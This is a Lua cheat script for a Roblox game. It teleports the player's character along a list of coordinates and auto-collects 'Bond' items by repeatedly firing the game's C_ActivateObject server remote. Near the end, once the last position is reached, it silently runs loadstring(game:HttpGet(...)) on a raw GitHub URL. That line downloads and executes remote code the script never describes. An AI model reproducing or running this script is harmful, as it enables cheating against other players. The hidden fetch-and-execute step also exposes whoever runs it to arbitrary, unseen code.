local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local positions = {
    Vector3.new(57, 3, 30000), Vector3.new(57, 3, 26000), Vector3.new(57, 3, 24000),
    Vector3.new(57, 3, 22000), Vector3.new(57, 3, 20000), Vector3.new(57, 3, 18000),
    Vector3.new(57, 3, 16000), Vector3.new(57, 3, 14000), Vector3.new(57, 3, 12000),
    Vector3.new(57, 3, 10000), Vector3.new(57, 3, 8000), Vector3.new(57, 3, 6000),
    Vector3.new(57, 3, 4000), Vector3.new(57, 3, 2000), Vector3.new(57, 3, 0),
    Vector3.new(57, 3, -2000), Vector3.new(57, 3, -4000), Vector3.new(57, 3, -6000),
    Vector3.new(57, 3, -8000), Vector3.new(57, 3, -10000), Vector3.new(57, 3, -12000),
    Vector3.new(57, 3, -14000), Vector3.new(57, 3, -16000), Vector3.new(57, 3, -18000),
    Vector3.new(57, 3, -20000), Vector3.new(57, 3, -22000), Vector3.new(57, 3, -24000),
    Vector3.new(57, 3, -26000), Vector3.new(57, 3, -28000), Vector3.new(57, 3, -30000),
    Vector3.new(57, 3, -32000), Vector3.new(57, 3, -34000), Vector3.new(57, 3, -36000),
    Vector3.new(57, 3, -38000), Vector3.new(57, 3, -40000), Vector3.new(57, 3, -48000),
    Vector3.new(57, 3, -49032),
}

local duration = 0.9
local bondPauseDuration = 0.9
local foundBonds = {}
local bondCount = 0

-- GUI Setup
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:FindFirstChildOfClass("PlayerGui")

local bondCounter = Instance.new("TextLabel")
bondCounter.Size = UDim2.new(0.3, 0, 0.1, 0)
bondCounter.Position = UDim2.new(0.5, 0, 0.7, 0)
bondCounter.AnchorPoint = Vector2.new(0.5, 0.5)
bondCounter.BackgroundTransparency = 0.5
bondCounter.TextScaled = true
bondCounter.Font = Enum.Font.SourceSansBold
bondCounter.TextColor3 = Color3.fromRGB(255, 255, 255)
bondCounter.Text = "Bonds Found: 0"
bondCounter.Parent = screenGui

task.spawn(function()
    task.wait(1)
    screenGui:Destroy()
end)

local function updateBondCount()
    bondCounter.Text = "Bonds Found: " .. tostring(bondCount)
end

-- Tween teleportation function
local function tweenToPosition(targetPosition)
    local LocalPlayer = game.Players.LocalPlayer
    LocalPlayer:RequestStreamAroundAsync(targetPosition) -- Preload the location
    task.wait(0.5) -- Allow streaming before moving

    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    
    tween:Play()
    tween.Completed:Wait()
end

-- Bond Detection Function
local function findBonds()
    local bonds = {}

    for _, bond in ipairs(workspace.RuntimeItems:GetDescendants()) do
        if bond:IsA("Model") and (bond.Name == "Bond" or bond.Name == "Bonds") and bond.PrimaryPart then
            table.insert(bonds, bond)
        end
    end

    return bonds
end

task.spawn(function()
    for _, pos in ipairs(positions) do
        tweenToPosition(pos)
        task.wait(duration)

        if pos == Vector3.new(57, 3, -49032) then
            print("Reached final position, waiting 15 seconds...")
            task.wait(15)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
            print("Executed loadstring after 15 seconds.")
        end
                        
        local bonds = findBonds()

        for _, bond in ipairs(bonds) do
            local bondPos = bond.PrimaryPart.Position
            local alreadyVisited = false

            for _, storedPos in ipairs(foundBonds) do
                if (bondPos - storedPos).Magnitude < 1 then
                    alreadyVisited = true
                    break
                end
            end

            if not alreadyVisited then
                table.insert(foundBonds, bondPos)
                bondCount = bondCount + 1
                tweenToPosition(bondPos)
                print("Bond found! Moving to " .. tostring(bondPos))
                task.wait(bondPauseDuration)

                updateBondCount()
                tweenToPosition(pos)
            end
        end
    end
end)

task.spawn(function()
    task.wait(2)

    while true do
        task.wait(0.1)

        local items = game.Workspace:WaitForChild("RuntimeItems")

        for _, bond in pairs(items:GetDescendants()) do
            if bond:IsA("Model") and (bond.Name == "Bond" or bond.Name == "Bonds") and bond.PrimaryPart then
                local dist = (bond.PrimaryPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                if dist < 100 then
                    game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Network"):WaitForChild("RemotePromise"):WaitForChild("Remotes"):WaitForChild("C_ActivateObject"):FireServer(bond)
                    print("Bond collected:", bond.Name)
                end
            else
                warn("PrimaryPart missing or object name mismatch for Bond!")
            end
        end
    end
end)
